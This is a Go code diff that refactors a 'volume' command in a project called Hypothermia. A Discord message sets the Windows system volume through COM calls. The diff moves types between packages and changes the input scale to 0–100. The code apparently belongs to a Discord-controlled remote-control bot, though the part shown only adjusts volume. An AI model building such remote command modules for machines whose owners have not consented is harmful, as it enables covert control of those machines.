@@ -7,8 +7,6 @@ import (
 	"unsafe"
 
 	"Hypothermia/src/misc"
-	"Hypothermia/src/utils"
-
 	"github.com/bwmarrin/discordgo"
 )
 
@@ -16,8 +14,7 @@ const (
 	volUsage string = "[volume]"
 
 	volArgsError  string = "🟥 Expected 1 argument."
-	volConvError  string = "🟥 Failed to convert argument."
-	volLevelError string = "🟥 Number needs to be between 0.0 and 1.0."
+	volLevelError string = "🟥 Number needs to be between 0 and 100."
 
 	volInitError     string = "🟥 Failed to initialize."
 	colCreateError   string = "🟥 Failed to create instance."
@@ -25,7 +22,7 @@ const (
 	volActivateError string = "🟥 Failed to activate audio endpoint."
 	volSetError      string = "🟥 Failed to set volume."
 
-	volSetSuccess string = "🟩 Set volume to %.1f%%."
+	volSetSuccess string = "🟩 Set volume to %d%%."
 )
 
 var (
@@ -44,10 +41,11 @@ func (*VolumeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args
 
 	vol, err := strconv.ParseFloat(args[0], 32)
 	if err != nil {
-		s.ChannelMessageSendReply(m.ChannelID, volConvError, m.Reference())
+		s.ChannelMessageSendReply(m.ChannelID, misc.ERROR_CONVERT, m.Reference())
 		return
 	}
 
+	vol = vol / 100
 	if vol < 0.0 || vol > 1.0 {
 		s.ChannelMessageSendReply(m.ChannelID, volLevelError, m.Reference())
 		return
@@ -61,12 +59,12 @@ func (*VolumeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args
 
 	defer uninitialize.Call()
 
-	var enumerator *utils.IMMDeviceEnumerator
+	var enumerator *misc.IMMDeviceEnumerator
 	res, _, _ = create.Call(
-		uintptr(unsafe.Pointer(&utils.CLSID_MMDeviceEnumerator)),
+		uintptr(unsafe.Pointer(&misc.CLSID_MMDeviceEnumerator)),
 		0,
 		23,
-		uintptr(unsafe.Pointer(&utils.IID_IMMDeviceEnumerator)),
+		uintptr(unsafe.Pointer(&misc.IID_IMMDeviceEnumerator)),
 		uintptr(unsafe.Pointer(&enumerator)),
 	)
 
@@ -77,7 +75,7 @@ func (*VolumeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args
 
 	defer enumerator.Release()
 
-	var device *utils.IMMDevice
+	var device *misc.IMMDevice
 	res, _, _ = syscall.SyscallN(
 		enumerator.Vtbl.GetDefaultAudioEndpoint,
 		uintptr(unsafe.Pointer(enumerator)),
@@ -93,11 +91,11 @@ func (*VolumeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args
 
 	defer device.Release()
 
-	var endpoint *utils.IAudioEndpointVolume
+	var endpoint *misc.IAudioEndpointVolume
 	res, _, _ = syscall.SyscallN(
 		device.Vtbl.Activate,
 		uintptr(unsafe.Pointer(device)),
-		uintptr(unsafe.Pointer(&utils.IID_IAudioEndpointVolume)),
+		uintptr(unsafe.Pointer(&misc.IID_IAudioEndpointVolume)),
 		23,
 		0,
 		uintptr(unsafe.Pointer(&endpoint)),
@@ -123,7 +121,7 @@ func (*VolumeCommand) Run(s *discordgo.Session, m *discordgo.MessageCreate, args
 		return
 	}
 
-	s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(volSetSuccess, float64(vol)*100), m.Reference())
+	s.ChannelMessageSendReply(m.ChannelID, fmt.Sprintf(volSetSuccess, int(vol*100)), m.Reference())
 }
 
 func (*VolumeCommand) Name() string {
